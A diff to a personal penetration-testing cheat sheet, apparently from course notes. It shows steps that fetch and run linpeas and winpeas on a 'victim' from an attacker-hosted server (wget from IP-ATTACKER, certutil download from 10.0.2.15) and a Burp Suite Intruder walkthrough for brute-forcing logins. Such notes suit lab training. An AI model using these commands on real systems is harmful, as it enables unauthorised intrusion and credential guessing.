@@ -147,10 +147,59 @@ automated tool to check if there are some potential priv escal inside the target
 	- `wget http://IP-ATTACKER/linpeas.sh`
 	- `chmod +x linpeas.sh`
 	- `./linpeas.sh`
-	
+
+#### winpeas
+same as [[cheet#linpeas]] but -->  for windows
+=>
+automated tool to check if there are some potential priv escal inside the target
+- download the .exe from [here](https://github.com/carlospolop/PEASS-ng/releases/tag/20240211-db8c669a)
+- Saved it locally inside a folder (+)
+- create a server with python to download the script from the victim
+- `cd (+)`
+- `python3 -m http.server 80`
+- from the victim shell:
+	- go inside a directory where you can write file
+	- Use the correspective wget in windows
+	- `certutil.exe -urlcache -f http://10.0.2.15/winpeas.exe winpeas.exe`   
+	     (download from the ip winpeas.exe and save it as winpeas.exe)
+	- `winpeas.exe`
+	- 
 
 ----
+## BurpSuite
+### Bruteforcing Login
+Set [[cheet#FoxyProxy]]
+- Turn on the proxy
+- Open Burp
+- Go to Proxy 
+- Click Intercept On
+- Try a login in the website with random credentials
+- Burp will intercept the request
+	- Right Click on the request > Send to Intruder
+	- From Intruder click "Clear"    (to clear the fields)
+	- Select the username value in the request and click Add
+	- Do the same for the password value
+	- Select as Attack Type "Cluster Bomb"
+	- Go to "Payloads"
+	- Add all the possible usernames
+	- Select "Payload Set" to 2 (so to set all the possible passwords)
+	- Add all the possible passwords
+	- Click Start "Attack"
+	- Look for difference inside Status Code and Length
+	Example with images -->  [[Notes/TCM/Capstones/Butler/report#BurpSuite]]
+
+-----
 ## Sites
 ### GTFOBins 
 curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems
 [GTFOBins](https://gtfobins.github.io/)
+
+----
+### Browser Extensions
+#### FoxyProxy 
+Useful for settings Browser for using BurpSuite
+
+add the firefox [extension](https://addons.mozilla.org/nl/firefox/addon/foxyproxy-basic/)
+Go to the Settings > Add Proxy
+Set the proxy in this way:
+![[Pasted image 20240215140635.png]]
